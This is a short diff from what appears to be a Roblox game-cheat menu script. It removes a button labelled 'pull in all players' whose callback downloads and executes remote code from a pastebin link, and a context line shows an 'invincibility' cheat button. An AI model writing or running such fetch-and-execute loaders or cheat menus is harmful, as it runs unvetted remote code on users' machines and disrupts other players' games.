@@ -585,18 +585,6 @@ Tab:AddButton({
 
 Tab:AddButton({
 
-	Name = "吸取全部玩家",
-
-	Callback = function()
-
-     loadstring(game:HttpGet('https://pastebin.com/raw/hQSBGsw2'))()
-
-  	end    
-
-})
-
-Tab:AddButton({
-
 	Name = "人物无敌",
 
 	Callback = function()
